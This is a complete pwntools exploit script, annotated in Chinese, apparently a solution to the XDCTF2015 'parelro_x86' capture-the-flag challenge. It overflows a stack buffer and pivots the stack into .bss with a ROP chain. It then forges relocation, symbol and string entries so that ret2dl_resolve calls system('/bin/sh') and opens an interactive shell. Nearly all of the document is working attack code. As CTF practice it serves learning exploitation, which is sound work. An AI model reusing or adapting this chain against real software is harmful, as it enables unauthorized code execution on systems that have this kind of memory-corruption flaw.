from pwn import *
elf = ELF('./parelro_x86')
offset = 112
read_plt = elf.plt['read']

ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"
pop_ebp_ret = 0x0804861b # ROPgadget --binary parelro_x86 | grep 'pop ebp ; ret'
leave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"

stack_size = 0x800
bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"
plt_0 = 0x08048380 # objdump -d -j .plt bof  执行 <push link_map，jmp dl_resolve>
rel_plt = 0x08048330 # objdump -s -j .rel.plt bof

# 栈迁移的目的地
base_stage = bss_addr + stack_size

index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移
write_got = elf.got['write']
dynsym = 0x080481d8
dynstr = 0x08048278

# fake_sym_addr 地址按照0x10字节对齐
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小
fake_sym_addr = fake_sym_addr + align

index_dynsym = (fake_sym_addr - dynsym) // 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号
r_info = (index_dynsym << 8) | 0x7 # 要满足：ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT，即最低字节要为7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)


r = process('./parelro_x86')

r.recvuntil('Welcome to XDCTF2015~!\n')
payload = b'A' * offset
payload += p32(read_plt) # 读100个字节到base_stage
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中
payload += p32(base_stage)
payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage
r.sendline(payload)

cmd = b"/bin/sh"

# stage3: 
# 栈迁移，调plt[0]，传入伪造的 index_offset，指向我们自定义的.rel.plt表项内容
# 并且控制r_info，指向我们伪造的.dynsym表项；再控制.dynsym表项中的st_name，指向我们控制的.dynstr表项内容
# --------> base_stage
payload2 = b'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += b'AAAA'
payload2 += p32(base_stage + 80) # 对应system('/bin/sh')
payload2 += p32(0xdeadbeef) # 后面的2个参数不需要了
payload2 += p32(0xdeadbeef)
# (base_stage+28)的位置
payload2 += fake_reloc
# (base_stage+36)的位置
payload2 += b'B' * align
# (fake_sym_addr)的位置
payload2 += fake_sym
payload2 += b"system\x00"
payload2 += b'A' * (80 - len(payload2))
# base_stage + 80
payload2 += cmd + b'\x00'
payload2 += b'A' * (100 - len(payload2))
# payload2结束，刚好100字节

r.sendline(payload2)
r.interactive()